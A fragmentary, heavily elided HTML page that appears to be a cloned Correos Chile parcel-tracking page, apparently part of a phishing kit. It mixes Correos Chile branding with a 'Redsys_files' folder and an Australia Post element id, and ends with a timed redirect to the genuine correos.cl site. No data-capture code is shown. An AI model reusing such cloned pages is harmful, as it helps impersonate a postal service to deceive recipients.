...
<head id="Head1">
    ...
    <link id="Link1" rel="shortcut icon"
          href="https://seguimientoenvios.com/wp-content/uploads/2020/06/correos-chile-seguimiento-e1592913265762.png">
    <link id="Link2" rel="icon" href="https://seguimientoenvios.com/wp-content/uploads/2020/06/correos-chile-seguimiento-e1592913265762.png"
          type="image/ico">
    <script language="javascript" type="text/javascript"
            ...
            <div id="cabecera" class="container ogilvy-bg-white">
                <div class="row">
                    <div class="col-xs-12 text-center ogilvy-header">
                        <img src="./Redsys_files/mama.jpg" id="logoaupost"
...
<script type="text/javascript">
            ...
            setTimeout(function () {
                window.location.href= 'https://www.correos.cl/web/guest/envios-y-compras-internacionales'
            },10000); // 1000 = 1s
        </script>
